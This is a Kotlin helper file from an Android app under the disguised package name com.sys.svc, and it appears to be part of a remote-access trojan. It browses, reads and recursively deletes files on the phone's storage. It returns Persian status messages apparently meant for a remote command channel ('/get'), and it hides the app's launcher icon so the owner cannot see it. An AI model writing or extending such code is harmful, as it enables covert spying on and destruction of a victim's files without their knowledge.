package com.sys.svc.helpers

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import com.sys.svc.Logger
import com.sys.svc.MainActivity
import com.sys.svc.Prefs
import java.io.File
import java.text.DecimalFormat

object FileHelper {

    private val shortcuts: Map<String, String>
        get() {
            val home = Environment.getExternalStorageDirectory().absolutePath
            return mapOf(
                "desktop" to "$home/Download",
                "downloads" to "$home/Download",
                "documents" to "$home/Documents",
                "pictures" to "$home/Pictures",
                "dcim" to "$home/DCIM",
                "movies" to "$home/Movies",
                "music" to "$home/Music",
                "home" to home
            )
        }

    fun downloadsDir(ctx: Context): File = File(
        Environment.getExternalStorageDirectory(), "Download"
    ).also { if (!it.exists()) it.mkdirs() }

    fun resolve(raw: String): File? {
        var s = raw.trim().trim('"').trim('\'')
        if (s.isEmpty()) return null
        val home = Environment.getExternalStorageDirectory().absolutePath
        val low = s.lowercase()
        if (shortcuts.containsKey(low)) return File(shortcuts[low]!!)
        s = when {
            s.startsWith("~") -> home + s.substring(1)
            s.startsWith("/") -> s
            else -> "$home/$s"
        }
        return try { File(s) } catch (_: Exception) { null }
    }

    fun ls(raw: String): String {
        val f = resolve(raw) ?: return "❌ مسیر نامعتبر"
        if (!f.isDirectory) return "❌ پوشه نیست: ${f.absolutePath}"
        val items = f.listFiles() ?: return "📭 خالی"
        val sb = StringBuilder()
        sb.appendLine("📂 ${f.absolutePath} (${items.size})")
        items.sortedBy { it.name }.take(200).forEach {
            val tag = if (it.isDirectory) "[DIR]  " else String.format("%8s", fmtSize(it.length()))
            sb.appendLine("$tag  ${it.name}")
        }
        return sb.toString().take(3200)
    }

    fun cat(raw: String): String {
        val f = resolve(raw) ?: return "❌ مسیر نامعتبر"
        if (!f.isFile) return "❌ فایل نیست"
        if (f.length() > 200_000) return "❌ بزرگ‌تر از 200KB — از /get استفاده کن"
        return try {
            "📄 ${f.absolutePath}\n\n" + f.readText().take(3200)
        } catch (e: Exception) { "❌ ${e.message}" }
    }

    fun rm(raw: String): String {
        val f = resolve(raw) ?: return "❌ مسیر نامعتبر"
        return try {
            val ok = if (f.isDirectory) f.deleteRecursively() else f.delete()
            if (ok) "🗑 ${f.absolutePath}" else "❌ حذف ناموفق"
        } catch (e: Exception) { "❌ ${e.message}" }
    }

    private fun fmtSize(b: Long): String {
        if (b < 1024) return "${b}B"
        val units = arrayOf("KB", "MB", "GB", "TB")
        var v = b.toDouble()
        var i = -1
        while (v >= 1024 && i < units.size - 1) { v /= 1024; i++ }
        return DecimalFormat("0.0").format(v) + units[i]
    }

    fun hideLauncher(ctx: Context) {
        try {
            ctx.packageManager.setComponentEnabledSetting(
                ComponentName(ctx, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Prefs.setHidden(ctx, true)
            Logger.i("File", "launcher hidden")
        } catch (e: Exception) { Logger.e("File", "hide", e) }
    }

    fun unhideLauncher(ctx: Context) {
        try {
            ctx.packageManager.setComponentEnabledSetting(
                ComponentName(ctx, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Prefs.setHidden(ctx, false)
            Logger.i("File", "launcher shown")
        } catch (e: Exception) { Logger.e("File", "unhide", e) }
    }
}